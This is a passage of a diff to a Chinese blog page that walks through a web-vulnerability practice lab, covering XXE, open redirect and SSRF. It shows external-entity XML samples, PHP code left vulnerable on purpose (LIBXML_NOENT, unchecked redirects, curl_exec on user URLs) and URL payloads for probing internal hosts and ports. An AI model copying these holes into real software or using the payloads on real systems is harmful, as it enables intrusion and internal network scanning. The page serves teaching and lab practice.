 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>You are a good man<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>其中，DTD（Document Type Definition，文档类型定义），用来为 XML 文档定义语法约束，可以是内部申明也可以使引用外部DTD现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的，从而也就直接避免了这个漏洞。</p>
 <pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">内部申明DTD格式
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token punctuation">[</span><span class="token internal-subset">元素申明</span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
@@ -975,12 +1013,14 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
 
 引用公共DTD格式
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">根元素</span> <span class="token name">PUBLIC</span> <span class="token string">"DTD标识名"</span> <span class="token string">"公共DTD的URI"</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><strong>内部实体引用</strong></p>
 <pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version = "1.0"?&gt;</span>
 <span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">note</span> <span class="token punctuation">[</span><span class="token internal-subset">
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">hacker</span> <span class="token attr-name">"Hello!"</span><span class="token punctuation">&gt;</span></span>
 </span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;hacker;">&amp;hacker;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214213853922.png"></p>
 <p><strong>外部实体引用</strong></p>
 <pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?&gt;</span>
@@ -990,6 +1030,7 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
 </span><span class="token punctuation">]</span><span class="token punctuation">&gt;</span></span>
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>x</span><span class="token punctuation">&gt;</span></span><span class="token entity named-entity" title="&amp;f;">&amp;f;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>x</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>源码：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$html</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
 <span class="token comment">//考虑到目前很多版本里面libxml的版本都&gt;=2.9.0了,所以这里添加了LIBXML_NOENT参数开启了外部实体解析</span>
@@ -1005,6 +1046,7 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
         <span class="token variable">$html</span><span class="token operator">.=</span><span class="token string double-quoted-string">"&lt;p&gt;XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?&lt;/p&gt;"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
 
 <h2 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h2><blockquote>
@@ -1024,6 +1066,7 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
         <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$url</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
 
 <h2 id="SSRF（服务端请求伪造）"><a href="#SSRF（服务端请求伪造）" class="headerlink" title="SSRF（服务端请求伪造）"></a>SSRF（服务端请求伪造）</h2><blockquote>
@@ -1058,6 +1101,7 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
 ?url=https://x.x.x.x/ 
 
 //探测内网其他主机的端口 ?url=http://x.x.x.x:port<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>把url改成baidu</p>
 <p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214215750855.png"></p>
 <p>源码：</p>
@@ -1077,9 +1121,11 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
 <span class="token comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span>
 <span class="token comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span>
 <span class="token comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="file-get-content"><a href="#file-get-content" class="headerlink" title="file_get_content"></a>file_get_content</h3><p>file_get_contents() 把整个文件读入一个字符串中。该函数是用于把文件的内容读入到一个字符串中的首选方法。如果服务器操作系统支持，还会使用内存映射技术来增强性能。</p>
 <p>基础语法：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">file_get_contents</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span>include_path<span class="token punctuation">,</span>context<span class="token punctuation">,</span>start<span class="token punctuation">,</span>max_length<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <table>
 <thead>
 <tr>
@@ -1116,6 +1162,7 @@ HTML 旨在显示信息，而 XML 旨在传输信息。<span aria-hidden="true" 
     <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
